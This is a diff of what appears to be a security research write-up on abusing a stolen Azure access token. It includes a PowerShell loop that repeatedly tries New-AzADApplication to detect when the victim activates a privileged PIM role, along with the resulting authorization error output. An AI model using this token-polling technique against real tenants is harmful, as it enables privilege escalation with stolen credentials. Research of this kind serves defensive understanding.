@@ -79,8 +79,11 @@ Nope, 403, which is right user not PIMed . .
 And if we steal token, how we will find out if user is pimed??? Just run script =)
 
 >while (1 -eq 1 ){
->$command=try{New-AzADApplication -DisplayName blinQ *>&1}catch{$_}  $command | Out-File c:\CIS\iwanttoknow.txt -Append
-start-sleep -seconds 10
+>$command=try{New-AzADApplication -DisplayName blinQ *>&1}catch{$_}
+>
+>$command | Out-File c:\CIS\iwanttoknow.txt -Append
+>
+>start-sleep -seconds 10
 }
 
 Then user PIMed . . 
@@ -93,7 +96,7 @@ And jepp - token escalated without any additional moves . .
 >     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 >     CategoryInfo          : InvalidOperation: ({ body = {
   "...reADMyOrg"
-} }:<>f__AnonymousType12`1) [New-AzADApplication_CreateExpanded], Exception
+} }:<>f__AnonymousType121) [New-AzADApplication_CreateExpanded], Exception
      FullyQualifiedErrorId : Authorization_RequestDenied,Microsoft.Azure.PowerShell.Cmdlets.Resources.MSGraph.Cmdlets.NewAzADApplication_CreateExpanded
 >Az.MSGraph.internal\New-AzADApplication : Insufficient privileges to complete the operation.
 At C:\Program Files\WindowsPowerShell\Modules\Az.Resources\6.11.1\MSGraph.Autorest\custom\New-AzADApplication.ps1:698 char:5
@@ -101,7 +104,7 @@ At C:\Program Files\WindowsPowerShell\Modules\Az.Resources\6.11.1\MSGraph.Autore
 >     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 >     CategoryInfo          : InvalidOperation: ({ body = {
   "...reADMyOrg"
->} }:<>f__AnonymousType12`1) [New-AzADApplication_CreateExpanded], Exception
+>} }:<>f__AnonymousType121) [New-AzADApplication_CreateExpanded], Exception
      FullyQualifiedErrorId : Authorization_RequestDenied,Microsoft.Azure.PowerShell.Cmdlets.Resources.MSGraph.Cmdlets.NewAzADApplication_CreateExpanded
 >
 >DisplayName Id                                   AppId                               
